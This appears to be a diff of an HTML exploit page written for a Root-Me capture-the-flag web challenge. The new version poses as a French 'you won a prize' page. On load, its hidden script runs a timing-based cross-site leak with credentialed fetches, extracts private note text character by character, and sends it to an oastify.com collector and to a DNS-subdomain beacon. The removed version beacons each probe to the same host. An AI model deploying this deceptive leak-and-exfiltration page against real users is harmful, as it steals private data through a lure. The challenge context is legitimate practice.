@@ -1,118 +1,301 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>XS-Leak PoC</title>
+    <title>Innocent Page</title>
+    <meta charset="utf-8">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 50px; 
+            background: #f0f0f0; 
+        }
+        .container { 
+            max-width: 600px; 
+            margin: 0 auto; 
+            background: white; 
+            padding: 30px; 
+            border-radius: 10px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+        }
+        .hidden { display: none; }
+        .status { 
+            position: fixed; 
+            top: 10px; 
+            right: 10px; 
+            background: #333; 
+            color: white; 
+            padding: 10px; 
+            border-radius: 5px; 
+            font-size: 12px; 
+            max-width: 300px; 
+        }
+    </style>
 </head>
 <body>
-  <pre id="log">booting...</pre>
-  <script>
-    (async () => {
-      const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
-      const COLLECTOR = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/";
+    <!-- Page visible innocente -->
+    <div class="container">
+        <h1>🎉 Félicitations !</h1>
+        <p>Vous avez gagné notre concours ! Cliquez sur le lien ci-dessous pour récupérer votre prix.</p>
+        <p><a href="#" onclick="claimPrize()">🎁 Réclamer mon prix</a></p>
+    </div>
 
-      const qs = new URLSearchParams(location.search);
-      const noteId = Number(qs.get("id") || 1);
-      const chars = qs.get("chars") || "abcdefghijklmnopqrstuvwxyz0123456789_-{}";
-      const maxLen = Number(qs.get("max") || 64);
-      const margin = Number(qs.get("margin") || 1200);
-      const run = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+    <!-- Statut de l'attaque (masqué en production) -->
+    <div class="status hidden" id="status">
+        <div>Status: <span id="statusText">Initializing...</span></div>
+        <div>Found: <span id="foundText">-</span></div>
+        <div>Progress: <span id="progressText">0%</span></div>
+    </div>
 
-      const logEl = document.getElementById("log");
+    <script>
+        // Configuration - À ADAPTER selon le challenge
+        const CONFIG = {
+            // URL de base pour les tests (REMPLACE PAR L'URL RÉELLE DU CHALLENGE)
+            baseUrl: 'https://web-client-ch56.challenge01.root-me.org:58056/search?q=',
+            
+            // Alternative URLs à tester (MODIFIE SELON LE SITE)
+            testUrls: [
+                'https://web-client-ch56.challenge01.root-me.org:58056/search?q=',
+                'https://web-client-ch56.challenge01.root-me.org:58056/notes/2511/search?query=',
+                'https://web-client-ch56.challenge01.root-me.org:58056/api/search?term=',
+                'https://web-client-ch56.challenge01.root-me.org:58056/filter?name=',
+                'https://web-client-ch56.challenge01.root-me.org:58056/notes/2511?search=',
+				'https://web-client-ch56.challenge01.root-me.org:58056/notes/2511'
+				
+            ],
+            
+            // Caractères à tester (ordre optimisé pour l'anglais)
+            charset: 'etaoinshrdlcumwfgypbvkjxqz0123456789_-',
+            
+            // Paramètres de timing (optimisés pour bot)
+            timingThreshold: 20, // ms (plus sensible pour bot)
+            maxLength: 40,
+            requestDelay: 50, // ms - bot plus rapide, moins de rate limiting
+            
+            // URL pour exfiltrer les données - VA SUR https://webhook.site POUR OBTENIR TON URL
+            exfilUrl: 'http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/',
+            
+            // Mode debug (false pour production, true pour test)
+            debug: false
+        };
 
-      function ui(line) {
-        logEl.textContent += "\n" + line;
-      }
+        let extractedData = '';
+        let isRunning = false;
 
-      function short(v, n) {
-        return String(v == null ? "" : v).replace(/\s+/g, " ").slice(0, n || 180);
-      }
-
-      function send(ev, msg, extra) {
-        try {
-          const p = new URLSearchParams({
-            run,
-            ev: short(ev, 40),
-            msg: short(msg, 220),
-            data: short(JSON.stringify(extra || {}), 500),
-            t: String(Date.now())
-          });
-          const img = new Image();
-          img.referrerPolicy = "no-referrer";
-          img.src = `${COLLECTOR}?${p.toString()}`;
-        } catch (_) {
-          // ignore
+        function log(message, type = 'info') {
+            if (CONFIG.debug) {
+                console.log(`[${type.toUpperCase()}] ${message}`);
+                const statusEl = document.getElementById('statusText');
+                if (statusEl) statusEl.textContent = message;
+            }
         }
-      }
 
-      async function log(msg, extra) {
-        ui(msg);
-        send("log", msg, extra);
-      }
-
-      async function probe(prefix) {
-        const url = `${TARGET}/notes/${noteId}/${encodeURIComponent(prefix)}`;
-        const t0 = performance.now();
-        try {
-          await fetch(url, {
-            mode: "no-cors",
-            credentials: "include",
-            cache: "no-store"
-          });
-        } catch (_) {
-          // timing signal only
+        function updateProgress(current, total, found) {
+            if (CONFIG.debug) {
+                const progressEl = document.getElementById('progressText');
+                const foundEl = document.getElementById('foundText');
+                if (progressEl) progressEl.textContent = `${(current/total*100).toFixed(1)}%`;
+                if (foundEl) foundEl.textContent = found || '-';
+            }
         }
-        const dt = performance.now() - t0;
-        send("probe", `${prefix} => ${Math.round(dt)}ms`, { prefix, dt: Math.round(dt) });
-        return dt;
-      }
 
-      send("boot", "script_loaded", { href: location.href, noteId });
-      await log(`run=${run}`);
-      await log(`note_id=${noteId}`);
+        // Fonction principale d'extraction
+        async function extractNoteData() {
+            if (isRunning) return;
+            isRunning = true;
+            
+            log('Starting XS-Leak extraction...');
+            
+            // Test de base pour trouver la bonne URL
+            let workingUrl = null;
+            for (const url of CONFIG.testUrls) {
+                try {
+                    const baseTime = await measureTiming(url + 'NONEXISTENT');
+                    const testTime = await measureTiming(url + 'a');
+                    
+                    if (Math.abs(testTime - baseTime) > 10) {
+                        workingUrl = url;
+                        log(`Found working URL: ${url}`);
+                        break;
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            if (!workingUrl) {
+                log('No working URL found, using default');
+                workingUrl = CONFIG.baseUrl;
+            }
 
-      const misses = ["zz_not_found_a", "zz_not_found_b", "zz_not_found_c"];
-      const missTimes = [];
-      for (const m of misses) {
-        missTimes.push(await probe(m));
-      }
-      const baseline = missTimes.reduce((a, b) => a + b, 0) / missTimes.length;
-      const threshold = baseline + margin;
-      await log(`baseline=${Math.round(baseline)}ms threshold=${Math.round(threshold)}ms`, {
-        baseline: Math.round(baseline),
-        threshold: Math.round(threshold),
-        margin
-      });
-
-      let prefix = "";
-      let foundAny = false;
-
-      for (let i = 0; i < maxLen; i++) {
-        let found = false;
-        for (const c of chars) {
-          const candidate = prefix + c;
-          const dt = await probe(candidate);
-          await log(`try ${candidate} => ${Math.round(dt)}ms`);
-          if (dt > threshold) {
-            prefix = candidate;
-            found = true;
-            foundAny = true;
-            await log(`hit ${prefix}`);
-            send("hit", prefix, { prefix, dt: Math.round(dt) });
-            break;
-          }
+            // Extraction caractère par caractère
+            for (let pos = 0; pos < CONFIG.maxLength; pos++) {
+                let bestChar = null;
+                let bestTimeDiff = 0;
+                
+                // Mesure de base
+                const baseTime = await measureTiming(workingUrl + encodeURIComponent(extractedData + 'NONEXISTENT'));
+                
+                for (let i = 0; i < CONFIG.charset.length; i++) {
+                    const char = CONFIG.charset[i];
+                    const testString = extractedData + char;
+                    
+                    try {
+                        const testTime = await measureTiming(workingUrl + encodeURIComponent(testString));
+                        const timeDiff = testTime - baseTime;
+                        
+                        log(`Testing "${testString}": ${timeDiff.toFixed(2)}ms diff`);
+                        
+                        if (timeDiff > CONFIG.timingThreshold && timeDiff > bestTimeDiff) {
+                            bestChar = char;
+                            bestTimeDiff = timeDiff;
+                            log(`New best: "${char}" with ${timeDiff.toFixed(2)}ms`);
+                        }
+                        
+                        updateProgress(pos * CONFIG.charset.length + i, CONFIG.maxLength * CONFIG.charset.length, extractedData + (bestChar || ''));
+                        
+                        await sleep(CONFIG.requestDelay);
+                        
+                    } catch (e) {
+                        log(`Error testing ${char}: ${e.message}`);
+                    }
+                }
+                
+                if (bestChar) {
+                    extractedData += bestChar;
+                    log(`Found character: "${bestChar}" - Current: "${extractedData}"`);
+                } else {
+                    log(`No character found at position ${pos}, stopping`);
+                    break;
+                }
+            }
+            
+            log(`Extraction complete: "${extractedData}"`);
+            await exfiltrateData(extractedData);
+            isRunning = false;
         }
-        if (!found) break;
-      }
 
-      if (!foundAny) {
-        await log("diag:no_slow_response");
-      }
+        // Mesure de timing avec retry
+        async function measureTiming(url) {
+            const measurements = [];
+            
+            for (let i = 0; i < 3; i++) {
+                const start = performance.now();
+                try {
+                    await fetch(url, {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        credentials: 'include',
+                        cache: 'no-cache'
+                    });
+                } catch (e) {
+                    // Les erreurs sont normales en mode no-cors
+                }
+                measurements.push(performance.now() - start);
+                
+                if (i < 2) await sleep(50);
+            }
+            
+            // Retourne la médiane pour plus de stabilité
+            measurements.sort((a, b) => a - b);
+            return measurements[1];
+        }
 
-      await log(`final:${prefix}`);
-      send("final", prefix, { final: prefix });
-    })();
-  </script>
+        // Méthode alternative: Error-based leak
+        async function testErrorLeak(url) {
+            return new Promise((resolve) => {
+                const img = new Image();
+                const startTime = performance.now();
+                
+                img.onload = () => resolve({ result: 'success', time: performance.now() - startTime });
+                img.onerror = () => resolve({ result: 'error', time: performance.now() - startTime });
+                
+                img.src = url;
+                
+                setTimeout(() => resolve({ result: 'timeout', time: performance.now() - startTime }), 5000);
+            });
+        }
+
+        // Méthode alternative: Frame counting
+        async function testFrameLeak(url) {
+            return new Promise((resolve) => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = url;
+                document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    try {
+                        const frameCount = iframe.contentWindow ? iframe.contentWindow.length : -1;
+                        resolve(frameCount);
+                    } catch (e) {
+                        resolve(-1);
+                    } finally {
+                        document.body.removeChild(iframe);
+                    }
+                }, 3000);
+            });
+        }
+
+        // Exfiltration des données
+        async function exfiltrateData(data) {
+            try {
+                // Méthode 1: Webhook/RequestBin
+                if (CONFIG.exfilUrl) {
+                    await fetch(CONFIG.exfilUrl, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            extracted: data,
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent 
+                        })
+                    });
+                }
+                
+                // Méthode 2: DNS exfiltration
+                const dnsData = data.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
+                if (dnsData) {
+                    const img = new Image();
+                    img.src = `https://${dnsData}.YOUR-DNS-DOMAIN.com/pixel.gif`;
+                }
+                
+                // Méthode 3: URL fragment
+                if (data) {
+                    window.location.hash = btoa(data);
+                }
+                
+            } catch (e) {
+                log(`Exfiltration failed: ${e.message}`);
+            }
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function claimPrize() {
+            alert('Merci ! Votre prix sera envoyé sous peu.');
+        }
+
+        // Démarrage automatique immédiat (pour bot)
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                extractNoteData();
+            }, 500); // Démarrage rapide
+        });
+
+        // Démarrage de secours
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                if (!isRunning) extractNoteData();
+            }, 1000);
+        });
+
+        // Auto-start après 2 secondes même sans événements
+        setTimeout(() => {
+            if (!isRunning) extractNoteData();
+        }, 2000);
+    </script>
 </body>
 </html>
